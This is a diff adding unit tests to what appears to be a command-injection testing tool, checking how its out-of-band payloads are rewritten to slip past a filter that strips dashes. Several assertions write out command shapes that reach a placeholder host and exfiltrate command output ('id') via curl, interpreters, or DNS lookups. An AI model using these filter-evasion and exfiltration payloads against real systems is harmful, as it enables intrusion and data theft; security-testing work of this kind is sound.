@@ -654,5 +654,93 @@ class TestOobEval(unittest.TestCase):
             settings.OOB_EVAL = False
 
 
+class TestDashlessPayloads(unittest.TestCase):
+    """What the out-of-band payloads write once the run is working a filtered '-' out of them."""
+
+    def setUp(self):
+        self._saved = (list(settings.MULTI_ENCODED_PAYLOAD), settings.TARGET_OS, settings.PRINT_WITH_ECHO)
+        settings.TARGET_OS = settings.OS.UNIX
+        settings.PRINT_WITH_ECHO = False
+
+    def tearDown(self):
+        settings.MULTI_ENCODED_PAYLOAD, settings.TARGET_OS, settings.PRINT_WITH_ECHO = self._saved
+
+    def _dashless(self):
+        settings.MULTI_ENCODED_PAYLOAD = [settings.DASHLESS_TAMPER]
+
+    def test_default_payloads_are_unchanged(self):
+        settings.MULTI_ENCODED_PAYLOAD = []
+        self.assertEqual(payloads.reach_command("curl", "h.x"), "curl -s https://h.x/")
+        self.assertIn("ping -c1 h.x", payloads.dns_lookup_command("h.x"))
+        self.assertIn(' -c "', payloads.reach_command("python", "h.x"))
+        self.assertTrue(payloads.supports_exfiltration("curl"))
+
+    def test_curl_is_asked_without_the_silent_flag(self):
+        self._dashless()
+        self.assertEqual(payloads.reach_command("curl", "h.x"), "curl https://h.x/")
+
+    def test_lookup_chain_drops_ping(self):
+        self._dashless()
+        chain = payloads.dns_lookup_command("h.x")
+        self.assertNotIn("ping", chain)
+        self.assertEqual(chain.count("||"), 2)
+
+    def test_interpreters_read_their_program_from_stdin(self):
+        self._dashless()
+        for transport in ("python", "ruby", "php"):
+            command = payloads.reach_command(transport, "h.x")
+            self.assertNotIn("-", command.replace("h.x", "").replace("X-", ""), transport)
+            self.assertTrue(command.startswith("printf %s \""), transport)
+            self.assertTrue(command.endswith("|" + {"python": settings.LINUX_PYTHON_INTERPRETER}.get(transport, transport)), transport)
+
+    def test_interpreter_command_goes_in_through_the_environment(self):
+        self._dashless()
+        for transport in ("python", "ruby", "php"):
+            command = payloads.exfil_command(transport, "h.x", "id")
+            # Named twice: set on the interpreter's own environment, and read back inside its program.
+            self.assertIn(settings.RANDOM_VAR_GENERATOR + "='id'" + settings.SINGLE_WHITESPACE, command, transport)
+            self.assertEqual(command.count(settings.RANDOM_VAR_GENERATOR), 2, transport)
+            self.assertNotIn("stdin", command, transport)
+
+    def test_echo_run_prints_the_program_with_echo(self):
+        self._dashless()
+        settings.PRINT_WITH_ECHO = True
+        self.assertTrue(payloads.reach_command("python", "h.x").startswith("echo \""))
+
+    def test_clients_that_need_options_cannot_carry_output(self):
+        self._dashless()
+        for transport in ("curl", "wget", "openssl"):
+            self.assertFalse(payloads.supports_exfiltration(transport), transport)
+        for transport in ("python", "ruby", "php", "dns"):
+            self.assertTrue(payloads.supports_exfiltration(transport), transport)
+
+    def test_clients_that_need_options_are_not_swept(self):
+        self._dashless()
+        for transport in ("wget", "openssl"):
+            self.assertFalse(payloads.dash_allows(transport), transport)
+        for transport in ("curl", "python", "dns", "php", "ruby"):
+            self.assertTrue(payloads.dash_allows(transport), transport)
+        swept = payloads.transports()
+        self.assertNotIn("wget", swept)
+        self.assertNotIn("openssl", swept)
+        self.assertIn("curl", swept)
+        # The same sweep with the script out of use, so it is the dash rule that leaves them out.
+        settings.MULTI_ENCODED_PAYLOAD = []
+        self.assertIn("wget", payloads.transports())
+
+    def test_windows_target_is_left_alone(self):
+        self._dashless()
+        settings.TARGET_OS = settings.OS.WINDOWS
+        self.assertFalse(payloads.dashless())
+
+    def test_dns_loop_cuts_with_expr(self):
+        self._dashless()
+        with mock.patch("src.utils.settings.print_once"):
+            command = payloads.dns_exfil_command("h.x", "id", ";")
+        self.assertNotIn("cut -c", command)
+        self.assertIn("i=0", command)
+        self.assertIn("expr", command)
+
+
 if __name__ == "__main__":
     unittest.main()
